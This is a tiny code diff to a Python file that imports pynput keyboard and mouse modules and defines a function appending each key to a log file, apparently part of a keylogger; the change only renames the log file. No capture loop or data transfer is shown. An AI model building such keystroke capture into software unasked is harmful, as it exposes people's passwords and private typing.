@@ -1,7 +1,7 @@
 from pynput import keyboard, mouse
 
 def writeFile(key):
-    f = open("logz.txt", "a")
+    f = open("log.txt", "a")
     f.write(key)
     f.close()
 
